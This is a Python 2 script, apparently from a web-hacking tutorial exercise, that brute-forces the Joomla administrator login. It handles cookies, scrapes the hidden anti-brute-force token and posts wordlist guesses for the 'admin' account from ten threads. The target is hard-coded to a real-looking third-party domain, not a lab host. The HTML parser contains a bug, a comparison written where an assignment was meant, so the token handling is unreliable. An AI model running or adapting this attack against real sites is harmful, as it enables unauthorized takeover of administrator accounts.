#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Simple brute force for the Joomla login page.
The form gets sent to the administrator/index.php path as an HTTP POST.
The import elements in the login form are the following:

<form action="/administrator/index.php" method="post" id="form-login" class="form-inline">
<input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="User Name" size="15"/>
<input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
<select id="lang" name="lang" class="inputbox advancedSelect">
<option value="" selected="selected">Language - Default</option>
<option value="en-GB">English (United Kingdom)</option>
</select>
<input type="hidden" name="option" value="com_login"/>
<input type="hidden" name="task" value="login"/>
<input type="hidden" name="return" value="aW5kZXgucGhw"/>
<input type="hidden" name="1796bae450f8430ba0d2de1656f3e0ec" value="1" />
</form>

Note the last hidden field, it's name is a long randomized string, essential to
the Joomla anti-brute-forcing technique. That randomized string is checked
against your current user session, stored in a cookie, and even if you are
passing the correct credentials into the login processing script, if the
randomized token is not present, the authentication will fail.

This means we have to use the following request flow in our
brute forcer in order to be successful against Joomla:
1. Retrieve the login page, and accept all cookies that are returned.
2. Parse out all of the form elements from the HTML.
3. Set the username and/or password to a guess from our dictionary.
4. Send an HTTP POST to the login processing script including all HTML form fields and our stored cookies.
5. Test to see if we have successfully logged in to the web application.
"""

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser

# General settings
user_thread= 10
username = "admin"
wordlist_file = "wordlist.txt"
resume = None

# Target specific settings
target_url = "http://polska-kaliningrad.ru/administrator/index.php" # Where our script will first download and parse the HTML
target_post = "http://polska-kaliningrad.ru/administrator/index.php" # Where we will submit our brute-forcing attempt

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"  # A string that we’ll check for after each brute-forcing attempt in order to determine whether we are successful or not

# Now let's create the plumbing of our script. Some of the code here is already known from other exercises
# so only the newer stuff will be commented.
class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("[*] Finished setting up for %s" % username)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies") # Set up our cookie jar using the FileCookieJar class that will store the cookies in the cookies file
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar)) # Next we initialize our urllib2 opener, passing in the initialized cookie jar, which tells urllib2 to pass off any cookies to it

            response = opener.open(target_url)
            page = response.read()
            print("[*] Trying %s:%s (%d left)" % (self.username,brute,self.password_q.qsize()))

            # Parse out the hidden fields. When we have the raw HTML, we pass it off
            # to our HTML parser and call its feed method, which returns a dictionary
            # of all of the retrieved form elements.
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # Add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # Next we URL encode the POST variables, and then pass them in our subsequent HTTP request.
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            # Check if our login attempt was successful
            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print("[*] Username: %s" %  username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for the other threads to exit...")

# This forms the specific HTML parsing class that we want to use against our target.

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        # The first thing we do is create a dictionary in which our results will be stored
        self.tag_results = {}

    # When we call the feed function in the BruteParser class, it passes the entire HTML
    # document and our handle_starttag function is called whenever a tag is encountered.
    # In particular, we're looking for HTML 'input' tags and our main processing occurs when we determine that we have found one.
    # We begin iterating over the attributes of the tag, and if we find the name or value attributes,
    # we associate them in the tag_results dictionary.
    # After the HTML has been processed, our bruteforcing class can then replace the username and password fields
    # while leaving the remainder of the fields intact.
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_name == value

            if tag_name is not None:
                self.tag_results[tag_name] = value

# Function copy pasted from content_bruter.py
def build_wordlist(wordlist_file):
	# Read in the word list
	fd = open(wordlist_file, "rb")
	raw_words = fd.readlines()
	fd.close()

	found_resume = False
	words = Queue.Queue()

	for word in raw_words:
		word = word.rstrip().decode('utf-8') # Return a copy of the string with trailing characters removed
		# print(word)
		if resume is not None:
			# Resume a brute-forcing session if our network connectivity is
			# interrupted or the target site goes down
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print("Resume wordlist from: %s" % resume)

		else:
			words.put(word)

	return words

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
